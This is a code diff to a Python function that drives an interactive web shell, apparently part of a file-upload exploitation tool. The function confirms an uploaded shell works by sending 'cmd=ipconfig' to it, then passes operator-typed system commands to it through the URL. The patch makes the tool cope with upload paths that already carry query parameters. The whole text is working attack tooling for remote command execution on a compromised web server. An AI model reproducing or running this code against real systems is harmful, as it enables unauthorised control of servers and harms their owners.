@@ -25,6 +25,9 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
             options.upload_dir = options.upload_dir[:-1]
             parameter_exists = True
 
+        if "?" in options.upload_dir:
+            parameter_exists = True
+
         results(options.url, file_name, content_type, upload_dir, is_magic_bytes, options.output_dir, allowed_extension,
         current_time)
 
@@ -43,7 +46,11 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
         
         # Display $ if the shell isn't accessed with the root user
         if 'root' not in response.text:
-            final_url = f"{partial_url}{filename}?cmd=ipconfig"
+            if parameter_exists:
+                final_url = f"{partial_url}{filename}&cmd=ipconfig"
+            else:
+                final_url = f"{partial_url}{filename}?cmd=ipconfig"
+
             response, final_url = file_upload.send_get_request(headers, options, final_url)
             if 'Default Gateway' in response.text:
                 alerts.warning("Interactive shell is activated, you can enter system commands: ")
@@ -80,7 +87,10 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
                 filename = file_name.decode("ascii")
                 cmd_encoded = urllib.parse.quote(command)  # Encode the user command
                 partial_url = urljoin(options.url, options.upload_dir)
-                final_url = f"{partial_url}{filename}?cmd={cmd_encoded}"
+                if parameter_exists:
+                    final_url = f"{partial_url}{filename}&cmd={cmd_encoded}"
+                else:
+                    final_url = f"{partial_url}{filename}?cmd={cmd_encoded}"
 
                 # Split the URL to capture the user's command
                 user_command = final_url.split("=")
@@ -114,13 +124,14 @@ def interactive_shell(options, headers, file_name, content_type, upload_dir, is_
                     break
 
     else:
+        
         if options.upload_dir != 'optional' and not skip_module:
             parameter_exists = False
             
             if options.upload_dir.endswith("=/"):
                 options.upload_dir = options.upload_dir[:-1]
-                parameter_exists = True
-                
+                parameter_exists = True  
+
             filename = file_name.decode("ascii")
             partial_url = urljoin(options.url, options.upload_dir)
             final_url = f"{partial_url}{filename}"
